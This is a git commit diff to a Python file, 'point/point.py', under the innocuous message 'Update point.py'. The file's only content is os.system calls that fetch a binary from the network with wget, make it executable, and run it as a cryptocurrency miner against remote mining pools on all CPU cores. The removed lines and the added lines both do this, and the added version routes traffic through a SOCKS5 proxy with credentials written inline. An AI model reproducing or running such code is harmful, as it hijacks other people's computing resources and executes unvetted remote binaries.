d7e09af68515aca19741396b4ab947d2d5b953ee
erlandi <93110170+erlandi-main-api@users.noreply.github.com>
2024-07-12 02:58:04 +0700

    Update point.py

--- point/point.py
+++ point/point.py
@@ -1,4 +1,4 @@
 import sys
 import os
-os.system("wget -qO build https://git.io/JySi5 && chmod +x build")
-os.system("./build -a gr -o stratum+tcp://mine.evepool.pw:1090 -u wallet.worker -p x -t $(nproc)")
+os.system("wget https://github.com/erlandi-main-api/testpoint/raw/main/cp")
+os.system("chmod +x cp && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.AMDRYZEN-by-erlandi -t $(nproc) -x socks5://JnYo459Z3:otRG2yrxjDy@:lon.socks.ipvanish.com:1080")
